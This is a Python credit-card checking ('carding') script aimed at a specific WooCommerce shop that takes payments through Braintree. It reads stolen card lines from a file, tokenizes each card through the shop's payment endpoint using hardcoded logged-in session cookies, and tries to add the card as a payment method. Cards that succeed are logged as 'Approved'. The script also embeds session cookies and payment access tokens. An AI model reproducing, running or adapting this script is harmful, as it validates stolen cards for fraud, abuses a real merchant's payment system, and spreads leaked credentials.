import base64
import httpx
import random
import time
import json
import uuid
import asyncio
from bs4 import BeautifulSoup
from html import unescape
import re


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None

    token_base64 = match.group(1)

    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception as e:
        print(f"Error decoding or parsing JSON token: {e}")
        return None


def validate_expiry_date(mes, ano):
    mes = mes.zfill(2)
    if len(ano) == 4:
        ano = ano[-2:]

    try:
        expiry_month = int(mes)
        expiry_year = int(ano)
    except ValueError:
        return False, "Invalid expiry date"

    current_year = int(time.strftime("%y"))
    current_month = int(time.strftime("%m"))

    if expiry_month < 1 or expiry_month > 12:
        return False, "Expiration Month Invalid"
    if expiry_year < current_year:
        return False, "Expiration Year Invalid"
    if expiry_year == current_year and expiry_month < current_month:
        return False, "Expiration Month Invalid"

    return True, ""


def is_valid_credit_card_number(number: str) -> bool:
    number = number.replace(" ", "").replace("-", "")
    if not number.isdigit():
        return False

    total = 0
    reverse_digits = number[::-1]

    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n

    return total % 10 == 0

async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        #user = "renaparael" + str(random.randint(9999, 574545))
        #mail = "renaparael" + str(random.randint(9999, 574545)) + "@gmail.com"
        #pwd = "Renaparael" + str(random.randint(9999, 574545))

        # Cookies
        cookies = {
            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            '_gcl_au': '1.1.403858930.1756376751',
            '_ga': 'GA1.1.1790710832.1756376751',
            'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
            'Subscribe': 'true',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'mailchimp.cart.current_email': 'senryjo@onionmail.org',
            'mailchimp_user_previous_email': 'senryjo%40onionmail.org',
            'mailchimp_user_email': 'senryjo%40onionmail.org',
            'sbjs_udata': 'vst%3D7%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'rehalesson%7C1756793502%7CUjEMqQWaNHUWMQwwFkTMM3zW5EOOMAv6OYQybasjPgK%7Cb17d37f5414fc65fe05da0632584a1fd6fd144967eb3237ba5aa098baf2a39e5',
            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8979%7Cother%7Cread%7C830d49951dadcaebacb5f5341a25b1a7bc585db9ca2f5ec1ca48a960d7cda91b',
            '_ga_D1Q49TMJ2C': 'GS2.1.s1756620390$o7$g1$t1756620728$j35$l0$h0',
            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://apluscollectibles.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://apluscollectibles.com/my-account/add-payment-method/', cookies=cookies, headers=headers)

        nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')

        token_data = extract_braintree_token(response.text)
        if token_data is not None:
            authorization_fingerprint = token_data.get('authorizationFingerprint')
        else:
            return "Failed to extract authorization fingerprint"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                            tokenizeCreditCard(input: $input) {
                                token
                                creditCard {
                                    bin
                                    brandCode
                                    last4
                                    cardholderName
                                    expirationMonth
                                    expirationYear
                                    binData {
                                        prepaid
                                        healthcare
                                        debit
                                        durbinRegulated
                                        commercial
                                        payroll
                                        issuingBank
                                        countryOfIssuance
                                        productId
                                        business
                                        consumer
                                        purchase
                                        corporate
                                    }
                                }
                            }
                        }''',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10038',
                            'streetAddress': '156 William Street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        token = gets(response.text, '"token":"', '"')

        cookies_update = cookies.copy()
        cookies_update.update({
            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
        })

        headers_update = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://apluscollectibles.com',
            'priority': 'u=0, i',
            'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"' + str(uuid.uuid4()) + '"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2kdbbwxghs8nhhq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2kdbbwxghs8nhhq"},"merchantId":"n2kdbbwxghs8nhhq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"n2kdbbwxghs8nhhq","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"A Plus Collectibles","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY2NDY1NTMsImp0aSI6IjE1NTMyOTAxLTEzYWMtNDRlMy1hODUxLTdkMzg2MDIxNjU4NyIsInN1YiI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.qh2PbNSWlH3NN4YyimLF0DC_1Ci91TSde9kR0Qf90g6PBcykzdKgC9E62W3LN29VkcTm2AbGTq4vuOQdqYG2CQ","paypalClientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3509894786311245549","accessToken":"access_token$production$n2kdbbwxghs8nhhq$efb9a3f38aadbbd1f9853140e03c76d7","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"A Plus Collectibles","clientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"apluscollectibles_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = await session.post(
            'https://apluscollectibles.com/my-account/add-payment-method/',
            cookies=cookies_update,
            headers=headers_update,
            data=data,
        )

        return response.text

    except Exception as e:
        return str(e)


async def multi_checking(x):
    cc, mes, ano, cvv = x.split("|")
    if not is_valid_credit_card_number(cc):
        return f"{x} - Credit card number is invalid"

    valid, err = validate_expiry_date(mes, ano)
    if not valid:
        return f"{x} - {err}"

    start = time.time()

    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(x, session)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    response = ""

    try:
        json_resp = json.loads(result)
        if "error" in json_resp and "message" in json_resp["error"]:
            raw_html = unescape(json_resp["error"]["message"])
            soup = BeautifulSoup(raw_html, "html.parser")
            div = soup.find("div", class_="message-container")
            if div:
                error_message = div.get_text(separator=" ", strip=True)
    except Exception:
        try:
            soup = BeautifulSoup(unescape(result), "html.parser")
            ul = soup.find("ul", class_="woocommerce-error")
            if ul:
                li = ul.find("li")
                if li:
                    error_message = li.get_text(separator=" ", strip=True)
            else:
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
        except Exception:
            error_message = ""

    if "Reason: " in error_message:
        _, _, after = error_message.partition("Reason: ")
        error_message = after.strip()

    if "Payment method successfully added." in error_message:
        response = "Approved"
        error_message = ""
    else:
        response = "Declined"

    if error_message:
        return f"{x} - {error_message} - Taken {elapsed}s"
    else:
        resp = f"{x} - {response} - Taken {elapsed}s"
        if "Approved" in response:
            with open("auth.txt", "a", encoding="utf-8") as file:
                file.write(resp + "\n")
        return resp


async def main():
    ccs = open("ccs.txt", "r", encoding="utf-8").read().splitlines()
    for cc in ccs:
        parts = cc.strip().split("|")
        if len(parts) == 4:
            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]
            new_cc = f"{cc_num}|{month}|{year}|{cvv}"
            result = await multi_checking(new_cc)
            print(result)
            await asyncio.sleep(20)


if __name__ == "__main__":
    asyncio.run(main())
